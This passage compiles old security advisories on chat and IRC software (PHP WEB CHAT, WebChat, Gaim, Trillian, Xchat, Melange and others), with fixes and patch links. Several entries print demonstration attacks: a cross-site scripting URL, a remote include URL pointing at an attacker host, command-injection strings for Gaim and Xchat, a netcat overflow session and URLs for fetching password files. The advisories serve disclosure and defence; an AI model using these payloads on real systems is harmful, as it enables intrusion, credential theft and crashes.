A remote user spoofing the upgrade server(s) can cause arbitrary code to be installed on the target user's client.

A remote user spoofing the message advertisment server(s) can cause the target user's client to crash.

A remote user can create a malformed GIF image that will cause the target user's client to crash when attempting to display the image.
Solution: No solution was available at the time of this entry.

Title: 12Planet Chat Server Sends Administrative Password Over the Network in Clear Text
Description:
Dennis Rand at Infowarefare.dk reported two vulnerabilities in the 12Planet Chat Server.  A remote user sniffing the network can obtain the administrative password.  A remote user can also determine the installation path.
It is reported that the server's login page sends the password to the server in clear text without encryption.  This also occurs when a user enters expert mode and changes the administrative password.

A remote user can determine the installation directory with the following type of URL:

http://[target]:8080/qwe/qwe/qwe/index.html
Impact':
A remote user with the ability to sniff the network between the administrator and the server can determine the administrator's password.

A remote user can determine the installation path.
Solution: No vendor solution was available at the time of this entry.  The vendor has reportedly suggested that customers use an SSL proxy (such as the Apache proxy) to protect administrator login credentials.

Title: PHP WEB CHAT Input Validation Flaws Let Remote Users Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in PHP WEB CHAT.  A remote user can conduct cross-site scripting attacks.
It is reported that the register.php, login.php, and profile.php scripts do not properly filter HTML code from user-supplied input. A remote user can reportedly create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the vulnerable PHP WEB CHAT software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

Some demonstration exploit URLs are provided:

http://[victim]/chat_dir/register.php?register=yes&username=OverG&email=<scr*pt>alert%20("Test!")</scr*pt>&email1=<scr*

http://[victim]/chat_dir/login.php?option=lostpasswd&username=OverG

http://[victim]/chat_dir/profile.php?username=OverG
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the PHP WEB CHAT software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
No solution was available at the time of this entry.

[Editor's note:  It appears that the software is no longer generally available from Web Drive Limited.]

Title: SimpleChat! Discloses Information About Current Users to Remote Users
Description:
An information disclosure vulnerability was reported in SimpleChat!.  A remote user can view information about chat users.
It is reported that information about the users of a current chat session is stored in the /data/ directory.  Information includes the IP address and user name for each user.  A remote user can retrieve this information with the following type of URL:

http://[target]/chat/data/usr
Impact': A remote user can obtain information about users of a current chat session, including their IP address and chat user name.
Solution:
No vendor solution was available at the time of this entry.  The author of the report has issued an unofficial patch, available at:

http://www.dwcgr0up.com

Title: WFChat Discloses Nicknames and Passwords to Remote Users
Description:
A vulnerability was reported in WFChat.  A remote user can obtain usernames and passwords from the system.
It is reported that the software stores user nicknames and passwords in the following files:

!nicks.txt
!pwds.txt

A remote user can reportedly retrieve these files.  Some demonstration exploit URLs are provided:

http://[target]/chat/!nicks.txt
http://[target]/chat/!pwds.txt
Impact': A remote user can obtain user nick names and passwords.
Solution:
No vendor solution was available at the time of this entry.  The vendor's web site indicates that the software is unstable and is not supported.

An unofficial fix is reportedly available from the author of the report at:

http://www.dwcgr0up.com/

Title: WebChat Include File Bug in 'defines.php' Lets Remote Users Execute Arbitrary Commands
Impact: Execution of arbitrary code via network
Description:
An include file vulnerability was reported in WebChat.  A remote user can execute arbitrary PHP code and operating system commands on the target server.
Frog-m@n reported that the 'defines.php' script includes the 'db_mysql.php' and 'language/english.php' files relative to the $WEBCHATPATH variable but does not validate that the included files are from the proper location.  A remote user can specify a remote location for those include files, causing the target server to include and execute the remotely located files.

As an example, the following URL will cause the http://[attacker]/db_mysql.php file to be executed on the target server:

http://[target]/defines.php?WEBCHATPATH=http://[attacker]/

According to the report, this exploit is not possible is the register_globals parameter is set to ON.
Impact': A remote user can execute arbitrary PHP code and operating system commands on the target server.  The code or commands will run with the privileges of the web server.
Solution:
No vendor solution was available at the time of this entry.  The author of the report has issued an unofficial patch, available at:

http://www.phpsecure.info/

Title: SIRCD IRC Daemon Buffer Overflow Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the Smart IRC Daemon (SIRCD).  A remote user can execute arbitrary code on the server.
It is reported that the software does not properly check the bounds of user-supplied input.  When the software performs a reverse DNS lookup, the DNS server can reportedly supply a specially crafted response of the following format to trigger a stack overflow and execute arbitrary code on the target server:

[94 bytes of crap][EBP ][EIP ][400 bytes for nops and shellcode]

A demonstration exploit script is provided in the Source Message.
Impact': A remote user with control of a DNS server or the ability to spoof the DNS can cause arbitrary code to be executed on the target server.
Solution:
The vendor has released a fixed version, available via CVS:

http://cvs.quakenet.org/cgi-bin/cvsweb.cgi/?hidenonreadable=1&f=h&hidecvsroot=1&logsort=date&sortby=file&hideattic=1&cvsroot=sircd

A copy of the current CVS version (as of 4 Feb 2003) is available.  It is reported to be the pre-release 0.5.0 tree:

http://www.sircd.org/files/sircd-cvs.tar.gz

Title: BitchX IRC Chat Client Can Be Crashed By Remote Users
Version(s): BitchX-1.0c20cvs, BitchX-1.0c19 and prior; but not BitchX-1.0c18
Description:
A denial of service vulnerability was reported in the BitchX Internet Relay Chat (IRC) client.  A remote user can cause the client to crash.
It is reported that a remote user can send a specially crafted RPL_NAMREPLY numeric 353 message to trigger an overflow in the BitchX client, causing the client to crash.

A demonstration exploit is provided in the Source Message.
Impact': A remote user can cause the client to crash.
Solution:
No solution was available at the time of this entry.

The author of the report has provided an unofficial patch, available in the Source Message.

Title: CheetaChat Discloses User Password to Local Users
Description:
A password disclosure vulnerability was reported in the CheetaChat chat client software for Yahoo! Chat!  A local user can view the user's Yahoo! chat password.
It is reported that the 'yaliases.dat' file in the CheetaChat installation folder contains the user's password in encrypted form. However, the password can reportedly be retrieved by loading the file and logging in using the target user's ID.  Then, in the 'Settings', 'Preferences' menu, the 'Use internal Browser' option can be selected.  Then, the user can select 'Account/Password' on the 'Chat' menu to cause the password to be displayed in the URL.

The vendor has reportedly been notified.
Impact': A local user can obtain the target user's Yahoo! password.
Solution: No solution was available at the time of this entry.

Title: Eggdrop IRC Bot Lets Certain Remote Authenticated Users Invoke the Bot as a Proxy
Description:
A vulnerability was reported in the Eggdrop IRC bot software.  A remote authenticated user with certain privileges can use the bot as a proxy.
It is reported that a remote authenticated user with privileges to add new bot records can use a linked instance of the bot on the botnet as a proxy.

A user can reportedly add a bot with the following type of address and no password:

'127.0.0.1:25'

Then, the remote user can invoke the command 'relay [botname]' to connect to the specified port on the specified host.
Impact': A remote user with the privileges to add new IRC bot records can connect to arbitrary ports on hosts running instances of the bot.
Solution:
No solution was available at the time of this entry.

A unofficial patch to the net.c file is provided in the Source Message.

Title: (Sun Issues Fix for Sun Linux) Re: Gaim Instant Messaging Client Input Validation Flaw Lets Remote Users Execute Arbitrary Commands
Impact: Execution of arbitrary code via network
Description: A vulnerability was reported in the Gaim instant messaging client software. A remote user can cause arbitrary operating system commands to be executed on the target user's system when the target user clicks on a malicious Instant Messaging link. It is reported that the URL handler for the manual browser option contains a vulnerability. A remote user can create a specially crafted link to cause an operating system command to be executed by the target user's Gaim client when the user clicks on the link in the manual browser. The command execution will reportedly be transparent to the target user. The flaw occurs because the manual browser command is passed to the operating system shell without proper filtering of user-supplied characters. Use of the manual browser is reported to be the default configuration in some Gaim distributions. Use of third party browsers (non-manual browsers) is not affected, according to the report. A demonstration exploit link is provided: href='http://www.google.com/search/search?recovering+deleted+files" && [command goes here] / "'>check this out Robert McQueen is credited with reporting this flaw.
Impact': A remote user can cause arbitrary commands to be executed on a target user's system when the target user clicks on a link.
Solution:
Sun has issued a fix for the Sun Linux 5.0 "gaim" Instant Messaging Client:

gaim-0.59.1-0.7.2.i386.rpm

ftp://ftp.cobalt.sun.com/pub/products/sunlinux/5.0/en/updates/i386/RPMS/gaim-0.59.1-0.7.2.i386.rpm 

Sun Linux Patches are available at:

http://sunsolve.sun.com/patches/linux/security.html

Title: Rediff Bol Instant Messaging Client Sends Authentication Data in the Clear and Permits Remote Users to Terminate Sessions
Description:
Several vulnerabilities were reported in the Rediff Bol messaging client.  A remote user can cause a target user's session to terminate in certain situations.  The software also sends the user's login data over the network without encryption.
It is reported that a remote user can send a specially crafted URL ("rbol:rlogin") to the target user.  If the target user loads the URL, their Rediff Bol application will log the user out.  Sometimes, the target user will be required to terminate the 'bol.exe' application via the Task Manager in order to restart the application.

It is also reported that a remote user with access to the network connection between a target user and the messaging server can sniff the target user's authentication credentials.  The Rediff Bol client reportedly sends authentication information over the network without encryption.
Impact':
A remote user can cause a target user's session to terminate when the target user loads a malicious URL.

A remote user with access to the messaging traffic can view the target user's password when it is transmitted over the network.
Solution: No solution was available at the time of this entry.  The author of the report indicates that, as a partial workaround, you can temporarily delete or disable the "Rbol:" protocol from the 'HKCR\rbol' registry key to prevent the 'bol.exe' handler from running when the user loads a URL with the "Rbol:" protocol.

Title: Melange Chat System Buffer Overflow Lets Remote Users Execute Arbitrary Code on the System
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the Melange Chat System.  A remote user can crash the server or execute arbitrary code on the system.
iDEFENSE reported that a buffer overflow exists in the chat_InterpretData() function of the 'interpret.c' file, where user-supplied data is written to the msgText buffer and can be used to modify the instruction pointer.  A remote user can connect to the server and send specially crafted data to trigger the overflow and execute arbitrary code on the system.  The code will run with the privileges of the Melange server.

The following demonstration exploit method can be used to test if a target is vulnerable (based on whether the server shuts down or not):

$ nc localhost 6666
+++Online
>> Melange Chat Server (Version 1.10), Apr-25-1999

Welcome ! (Type /HELP for a list of commands)
/nick AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>> Your new name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (Line 0).
AAAAAAAAAAAAA..['A' repeated total of 480 times]..AAA
[0, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]: 
AAAAAAAAAAAAA..['A' repeated total of 480 times]..AAA>> The administrator
shut down the server !
+++Quit 

[Editor's note:  A similar flaw, or perhaps the same flaw, was reported in April 2002 in Alert ID #1004039.  In that Alert, a buffer overflow involving the '/yell' command was described.]
Impact': A remote user can crash the server or execute arbitrary code with the privileges of the Melange daemon.
Solution: No solution was available at the time of this entry.  The vendor is no longer providing support for the system and has stated that there are known security concerns.

Title: AOL Instant Messenger (AIM) File Sharing Bug May Let Remote Users Silently Force Downloads
Description:
Infested Nexus reported a vulnerability in AOL Instant Messenger (AIM).  A remote user can force a target user to silently download a file if file sharing is permitted, even if the target user does not accept the file.
It is reported that a remote user can send an arbitrary file with the name "[screen name].lst" to a target buddy user that has file sharing enabled.  The target user's system will reportedly download the file automatically, regardless of whether they accept the download or not.

According to the report, the tests work on Microsoft Windows 9x systems but may not work on Windows NT systems, as Windows NT systems use a "listing.txt" file instead of a ".lst" file.
Impact': A remote user can force a target user to download a file.
Solution: No solution was available at the time of this entry.

Title: XOOPS WebChat Module Input Validation Flaw Lets Remote Users Inject and Execute SQL Commands on the Underlying Database Server
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in the XOOPS WebChat Module.  A remote user can execute SQL commands on the database server.
It is reported that the software processes user-supplied input for the '$roomid' variable without properly filtering the input. A remote user can create a specially crafted value for that variable to execute SQL commands on the underlying SQL server.
Impact': A remote user can execute arbitrary SQL commands on the underlying SQL database server.
Solution:
No solution was available at the time of this entry.

The author of the report has provided an unofficial patch, available in the Source Message and at:

http://www.phpsecure.org/tutos/webchat.1-5.xoops.rc3.sql.injection.txt

Title: Yahoo! Messenger Invisible User Function Can Be Circumvented
Description:
A vulnerability was reported in Yahoo! Messenger.  A remote user can determine if an "invisible" user is online.
It is reported that the Yahoo! Messenger "Invisible" feature (which is used to hide your online status) can be circumvented by a remote user by attempting to "View Shared Files" of the target user.   The software will return a message that either displays "Asking for permissions" or "user offline".

The vendor has reportedly been notified.
Impact': A remote user can determine if an "invisible" user is online.
Solution: No solution was available at the time of this entry.

Title: Molly Internet Relay Chat (IRC) Bot Input Filtering Flaw Lets Remote Users Execute Arbitrary Shell Commands
Impact: Execution of arbitrary code via network
Description:
An input filtering vulnerability was reported in Molly, a Perl-based Internet Relay Chat (IRC) bot.  A remote user can execute arbitrary commands on the system.
It is reported that the software does not filter user-supplied input in 'plugins/nslookup.pl' during a shell call.  A remote user can supply a specially crafted string for the $host variable to cause arbitrary shell commands to be executed with the privileges of the user running the Molly script.
Impact': A remote user can execute arbitrary commands with the privileges of the user running Molly.
Solution: No solution was available at the time of this entry.  The author reportedly plans to correct some of the flaws.  The author has reportedly stated that code in the unusedplugins/ directory is not supported and may introduce security issues.

Title: Madhatter 'perlbot.pl' Internet Relay Chat (IRC) Bot Input Filtering Bugs Allow Remote Commands to Be Executed
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in Madhatter perlbot, an Internet Relay Chat (IRC) bot.  A remote user can execute arbitrary commands on the system.
It is reported that the script does not properly filter user-supplied input, allowing for remote command execution.

The script also makes an unsafe open() call when sending e-mail.  A remote user can exploit this to execute arbitrary shell commands.
Impact': A remote user can execute arbitrary shell commands with the privileges of the user running the script.

Title: Perlbot Internet Relay Chat (IRC) Bot Input Filtering Flaw Allows Remote Users to Execute Arbitrary Commands
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in the Perlbot Internet Relay Chat (IRC) bot.  A remote user can execute arbitrary commands on the system and read or execute files on the system.
It is reported that the software makes an unsafe system() call in Plugins/Misc/SpelCheck/SpelCheck.pm that permits a remote user to execute arbitrary shell commands.  The commands will run with the privileges of the Perlbot user.

The software also makes an unsafe open() call in Plog.pl that allows a remote user to read or execute arbitrary files located on the system with the privileges of the Perlbot user.
Impact': A remote user can execute arbitrary shell commands and read or execute arbitrary files on the system.
Solution:
The vendor has released a fixed version (1.9.3 and above), available at:

http://perlbot.sourceforge.net/

Title: Trillian Chat Client Can Be Crashed By Remote Users Sending Special Characters Via AIM Service
Description:
Another denial of service vulnerability was reported in the Trillian chat client.  A remote user can send specially crafted text sequences via the AOL Instant Messenger (AIM) service to cause the Trillian client to crash.
ComputerSecurityNow reported that a remote user can trigger an exception in trillian.exe (TALK.DLL) by sending a message via AIM with the one of the following strings in the message:

P > O < C
3 > 3 < 3
computer > security < now

[Editor's note:  Some users have reported being unable to reproduce this flaw.]
Impact': A remote user can cause the client to crash.
Solution: No solution was available at the time of this entry.

Title: Trillian IRC Chat Client Has More Bugs That Let Remote Servers Crash the Client
Description:
Some additional denial of service vulnerabilities were reported in the Trillian Internet Relay Chat (IRC) client.  A remote user can cause the client to crash.
It is reported that a remote user can send various IRC Raw Messages to cause Trillian to crash.  The following Raw Messages can trigger the flaw:

206, 211, 213, 214, 215, 217, 218, 243, 302, 317, 324, 332, 333, 352, 367

The messages are sent in the format: ':Server <Num>', where <Num> is one of the raw codes listed above.

Also, if Trillian receives a message regarding a user parting a channel that Trillian is not in (or if no channel is specified), Trillian will reportedly crash.  These messages are apparently sent in the form: ":nick!ident@address PART <Channel>"

It is also reported that a remote user (an IRC server) can send a block of data longer greater than 4095 bytes to cause Trillian to crash.

Some demonstration exploit code is provided in the Source Message.
Impact': A remote user (IRC server) can cause the Trillian client to crash.
Solution: No solution was available at the time of this entry.

Title: (Conectiva Issues Fix) Xchat '/dns' Command Bug May Let Remote Users Execute Arbitrary Commands on the Client Software
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in the Xchat graphical IRC client software.  A remote user may be able to cause arbitrary commands to be executed by the client under certain conditions.
It is reported that the vulnerability exists in the processing of the '/dns' command.  Server-supplied input is reportedly passed to the shell in an unfiltered manner in the cmd_exec() function (line 1863):

execl ("/bin/sh", "sh", "-c", cmd, 0);

If a malicious IRC server responds to a user-initiated '/dns' command with malicious content, the server can cause commands to be passed to the shell.  For example, a '/dns' command response of ";DISPLAY=localhost:0.0;xterm" will reportedly cause "host;DISPLAY=localhost:0.0;xterm" to be passed to the execl call and the arbitrary command will be executed.
Impact': A remote user with control of an IRC server may be able to cause arbitrary code to be executed on the Xchat user's client software.
Solution:
Conectiva has issued a fix:

ftp://atualizacoes.conectiva.com.br/6.0/RPMS/xchat-1.8.10-1U60_1cl.i386.rpm
ftp://atualizacoes.conectiva.com.br/6.0/SRPMS/xchat-1.8.10-1U60_1cl.src.rpm
ftp://atualizacoes.conectiva.com.br/7.0/RPMS/xchat-1.8.10-1U70_1cl.i386.rpm
ftp://atualizacoes.conectiva.com.br/7.0/RPMS/xchat-gtk-1.8.10-1U70_1cl.i386.rpm
ftp://atualizacoes.conectiva.com.br/7.0/SRPMS/xchat-1.8.10-1U70_1cl.src.rpm
ftp://atualizacoes.conectiva.com.br/8/RPMS/xchat-1.8.10-1U80_1cl.i386.rpm
ftp://atualizacoes.conectiva.com.br/8/RPMS/xchat-gtk-1.8.10-1U80_1cl.i386.rpm
ftp://atualizacoes.conectiva.com.br/8/SRPMS/xchat-1.8.10-1U80_1cl.src.rpm

Title: Trillian Chat Client Buffer Overflow in Processing 'JOIN' Command Allows Remote Code Execution
Impact: Execution of arbitrary code via network
Description:
Another buffer overflow was reported in the Trillian instant messaging client.  A remote user with an IRC server may be able to execute arbitrary code on the target user's system.
It is reported that if Trillian joins a channel with a name larger than 206 bytes, a buffer overflow will be triggered.

A remote user with an IRC server could respond to a Trillian client's JOIN command with a specially crafted response to cause the client to crash or to execute arbitrary code.

Some demonstration exploit code (to trigger a denial of service condition) is included in the Source Message.
Impact': A remote IRC server can cause the Trillian client to crash or execute arbitrary code in response to a JOIN command.
Solution: No solution was available at the time of this entry.

Title: Trilliam Instant Messaging Client Buffer Overflow in Processing PRIVMSG Commands Allows Remote Code Execution
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the Trillian instant messaging client in its processing of 'PRIVMSG' commands.  A remote user could execute arbitrary code on the system.
It is reported that an overflow exists in the processing of 'PRIVMSG' commands received from the remote IRC server.

A remote user (acting as an IRC server) can send a PRIVMSG with a nickname larger than 206 bytes to trigger the overflow.

Demonstration exploit code that causes the client to crash (but not to execute arbitrary code) is provided in the Source Message.
Impact': A remote user acting as a IRC server can cause arbitrary code to be executed by the Trillian client with the privileges of the Trillian user.
Solution: No solution was available at the time of this entry.

Title: (Version 1.0 is Also Affected) Re: Trillian Chat Client Buffer Overflow in 'ident' Daemon Lets Remote Users Crash the Client
Description:
A buffer overflow was reported in the 'ident' component of the Trillian chat client.  A remote user can cause the client to crash.
It is reported that a remote user can connect to the ident port (113) and send 418 bytes to cause Trillian to crash (if the ident feature is enabled). The author of the report indicates that the ability to execute arbitrary code is not known at this time.

Another user reports that Trillian 1.0 Pro is also affected.
Impact': A remote user can cause the Trillian client to crash.
Solution: No solution was available at the time of this entry.

Title: Trillian Chat Client Buffer Overflow in 'ident' Daemon Lets Remote Users Crash the Client
Description:
A buffer overflow was reported in the 'ident' component of the Trillian chat client.  A remote user can cause the client to crash.
It is reported that a remote user can connect to the ident port (113) and send 418 bytes to cause Trillian to crash (if the ident feature is enabled).  The author of the report indicates that the ability to execute arbitrary code is not known at this time.
Impact': A remote user can cause the Trillian client to crash.
Solution:
No solution was available at the time of this entry.

The author of the report recommends disabling the Trillian identd and using a 3rd party identd daemon if required.

Title: Trillian Chat Client Software Has a Buffer Overflow in the XML Parser
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the Trillian chat client.  The specific impact was not reported.  Buffer overflows often result in denial of service conditions or the execution of arbitrary code.
According to the report, there is a a buffer overflow in parsing XML files.  The report did not indicate whether this overflow could be used to execute arbitrary code or not.

A demonstration exploit is provided (trillian.xml file in the '<prefs>' section):

   [control name="colors" type="colors"]
   [colors  file="(4096 characters)"]

The vendor has reportedly been notified.
Impact': The specific impact was not reported.
Solution: No solution was available at the time of this entry.

Title: Gaim Instant Messaging Client Input Validation Flaw Lets Remote Users Execute Arbitrary Commands
Impact: Execution of arbitrary code via network
Description: A vulnerability was reported in the Gaim instant messaging client software. A remote user can cause arbitrary operating system commands to be executed on the target user's system when the target user clicks on a malicious Instant Messaging link. It is reported that the URL handler for the manual browser option contains a vulnerability. A remote user can create a specially crafted link to cause an operating system command to be executed by the target user's Gaim client when the user clicks on the link in the manual browser. The command execution will reportedly be transparent to the target user. The flaw occurs because the manual browser command is passed to the operating system shell without proper filtering of user-supplied characters. Use of the manual browser is reported to be the default configuration in some Gaim distributions. Use of third party browsers (non-manual browsers) is not affected, according to the report. A demonstration exploit link is provided: href='http://www.google.com/search/search?recovering+deleted+files" && [command goes here] / "'>check this out Robert McQueen is credited with reporting this flaw.
Impact': A remote user can cause arbitrary commands to be executed on a target user's system when the target user clicks on a link.
Solution:
The vendor has issued a fixed version (0.59.1), available at:

http://gaim.sourceforge.net/

Title: (Mandrake Issues Fix) Re: Gaim Instant Messaging Client Buffer Overflow in Jabber Module May Allow Remote Users to Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A potential buffer overflow vulnerability was reported in the Gaim instant messaging client software.  A remote user may be able to execute arbitrary code on the client.
It is reported that a buffer overflow exists in the Jabber plug-in module.  Neither the report nor the vendor's change log indicate if the remote execution of arbitrary code is possible or not.  No further details were provided.
Impact': A remote user may be able to cause arbitrary code to be executed on a target user's Gaim client, however that has not been confirmed.
Solution:
Mandrake has issued a fix.

 Linux-Mandrake 7.1:
 cc3f1b72c0b0a046c2d6e271ac4ef9a8  7.1/RPMS/gaim-0.59.1-1.1mdk.i586.rpm

Title: mIRC Chat Client Buffer Overflow in Scripting Function May Let Remote Users Execute Arbitrary Code on the System If a Vulnerable Script is Installed on the Target System
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the mIRC Windows-based Internet Relay Chat (IRC) client.  A mIRC user could install a remotely-supplied malicious or vulnerable script that will allow a remote user to execute arbitrary code on the system.
A buffer overflow vulnerability reportedly exists in the $asctime scripting function used to format Unix style time stamps.  A malicious script or vulnerable script (which must be downloaded by the target user) can pass a specially crafted string to the $asctime function to trigger a buffer overflow on the stack and execute arbitrary code.

According to the report, the default script included with mIRC does not call the $asctime function.  However, some major scripts available for download will call the $asctime function to decode data provided by the IRC server.

There are reported to be several forms in which $asctime can be called by a script.  Vulnerable scripts will apparently contain code such as the following, where the '$4' argument is a value supplied by the remote IRC server or other remote source:

//echo 1 uuuppz is idle since $asctime($4)"

If the string supplied as the format specifier is longer than 388 bytes, the return address on the stack will reportedly be overwritten.  According to the report, several special characters cannot be used in the string (including ASCII codes 72, 84, 90, 100, 104, 109, 110, 115, 116, 121, 122).

Demonstration exploit code is provided at:

http://www.uuuppz.com/research/adv-002-mirc.htm

The report credits Phrizer (DalNET #KORP) with discovering the flaw.
Impact': A remote user may be able to execute arbitrary code on the target user's system if the target user has a malicious script or vulnerable script installed.
Solution:
The vendor has released a fixed version (6.03), available at:

http://www.mirc.co.uk/get.html

Title: (Debian Issues Fix) Gaim Instant Messaging Client Buffer Overflow in Jabber Module May Allow Remote Users to Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A potential buffer overflow vulnerability was reported in the Gaim instant messaging client software.  A remote user may be able to execute arbitrary code on the client.
It is reported that a buffer overflow exists in the Jabber plug-in module.  Neither the report nor the vendor's change log indicate if the remote execution of arbitrary code is possible or not.  No further details were provided.
Impact': A remote user may be able to cause arbitrary code to be executed on a target user's Gaim client, however that has not been confirmed.
Solution:
Debian has released a fix version 0.58-2.2 for the current stable distribution (woody) and in version 0.59.1-2 for the unstable distribution (sid).  The old stable distribution (potato) is not affected since it doesn't ship the Gaim program.

The fixed version of Gaim no longer passes the user's manual browser command to the shell.  Commands which contain the %s in quotes will need to be amended, so they don't contain any quotes.  The 'Manual' browser command can be edited in the 'General' pane of the 'Preferences' dialog, which can be accessed by clicking 'Options' from the login window, or 'Tools' and then 'Preferences' from the menu bar in the buddy list window.

Debian GNU/Linux 3.0 alias woody
- --------------------------------

  Source archives:

Title: AOL Instant Messenger (AIM) Heap Overflow May Let Remote Users Crash a Target User's AIM Client When the Target User Clicks on a URL
Description:
A heap overflow vulnerability was reported in AOL Instant Messenger (AIM).  A remote user can cause the AIM client to crash.
Symantec (SecurityFocus) previously reported a heap overflow vulnerability in AOL Instant Messenger (AIM).  According to the report, a remote user can cause a target user's AIM Windows client to crash by sending them a specially crafted URL.  A remote user can apparently create a URL with 344 characters (such as space characters, which get converted to %20 by the client.

In this message, it is reported that the heap overflow resides in the "goim" handler and can be triggered via the "screenname" query string parameter.  The vulnerability can reportedly be triggered when the target AIM clicks "Get Info" to request information on the buddy.

In a posting to their web site, SecurityFocus/Symantec credited <p0pt4rtz @ hotmail.com> with reporting the flaw, but they did not indicate that the original message is publicly available.
Impact': A remote user may cause a target user's AIM client to crash when the target user takes action and clicks on a link.
Solution: No solution was available at the time of this entry.

Title: (Debian Issues Fix) IRSSI IRC Client Can Be Crashed By Remote Users Sending a Specially Crafted Channel Topic Name
Description:
A denial of service vulnerability was reported in the IRSSI Internet Relay Chat (IRC) client software.  A remote user on an IRC channel can cause the client to crash.
It is reported that the client will crash when it joins a channel that contains a long topic with the "\x1b\x5b\x30\x6d\x0d\x0a" string at the end of the topic name.  Also, a remote user on the channel can change the topic to this specially crafted topic name to cause the client to crash.
Impact': A remote user on an IRC channel that the client is logged into can cause the client to crash.
Solution:
Debian has released a fix in version 0.8.4-3.1 for the current stable stable distribution (woody) and in version 0.8.5-2 for the unstable distribution (sid).  The old stable distribution (potato) is not affected, since the corresponding portions of code are not present.  The same applies to irssi-gnome and irssi-gtk, which don't seem to be affected as well.
